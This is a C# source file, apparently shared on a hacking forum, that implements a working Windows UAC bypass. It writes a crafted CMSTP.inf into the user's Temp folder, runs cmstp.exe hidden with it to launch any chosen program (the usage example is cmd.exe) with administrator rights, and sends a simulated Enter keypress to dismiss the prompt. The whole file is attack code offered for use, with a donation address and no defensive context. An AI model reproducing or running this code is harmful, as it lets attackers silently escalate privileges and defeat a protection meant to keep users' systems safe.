using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Memory
{
    /// <summary>
    /// Created by gigajew based off of existing UAC bypass, extended functionality
    /// to run apps as administrator
    ///
    /// 09/18/2019 for www.hackforums.net
    ///
    /// Bitcoin donations very welcome: 12FP1JisjYCsgfteTLMQQMLNVBs65wZD8G
    /// </summary>
    /// <usage>
    /// Task.Run(() => Bypass.TryRun("c:\\windows\\system32\\cmd.exe") ).Wait( );
    /// </usage>
    /// <requirements>
    /// .NET 4.5 or later for async tasks
    /// </requirements>
    public static class Bypass
    {
        private const string user32 = "user32.dll";

        [DllImport(user32)]
        private static extern bool SetForegroundWindow(IntPtr hwnd);

        [DllImport(user32)]
        private static extern bool ShowWindow(IntPtr hwnd, int cmdShow);

        [DllImport(user32)]
        private static extern bool PostMessage(IntPtr hWnd, uint msg, int wParam, int lParam);

        private const int VK_RETURN = 0x0D;
        private const int WM_KEYDOWN = 0x100;

        // increase this on slow/laggy pcs perhaps
        public static int Timeout { get; set; } = 100;

        public static async Task TryRun(string filename)
        {
            try { await Run(filename); }
            catch (Exception e)
            {
                Debug.WriteLine(e.Message);
            }
        }
        public static async Task Run(string filename)
        {
            DirectoryInfo temporary_folder = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Temp"));
            if (!temporary_folder.Exists)
                temporary_folder.Create();

            FileInfo settings_file = new FileInfo(Path.Combine(temporary_folder.FullName, "CMSTP.inf"));
            string ini = $@"
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
powershell.exe ""Start-Process {filename} -Verb RunAs""
taskkill /IM cmstp.exe /F
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
""HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """"
[Strings]
ServiceName=""gigajew""
ShortSvcName=""gigajew""
";
            using (FileStream fs = settings_file.Create())
            {
                using (BinaryWriter wr = new BinaryWriter(fs, Encoding.ASCII))
                {
                    wr.Write(ini);
                    await fs.FlushAsync();
                }
            }
            using (Process p = new Process())
            {
                p.StartInfo.FileName = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmstp.exe");
                p.StartInfo.Arguments = string.Format("/au \"{0}\"", settings_file.FullName);
                p.StartInfo.UseShellExecute = false;
                p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                p.StartInfo.CreateNoWindow = true;
                p.Start();
                while (p.MainWindowHandle == IntPtr.Zero)
                {
                    await Task.Delay(Timeout);
                }
                if (SetForegroundWindow(p.MainWindowHandle) && ShowWindow(p.MainWindowHandle, 5))
                {
                    await Task.Delay(Timeout);
                    PostMessage(p.MainWindowHandle, WM_KEYDOWN, VK_RETURN, 0);
                }
            }
        }
    }
}
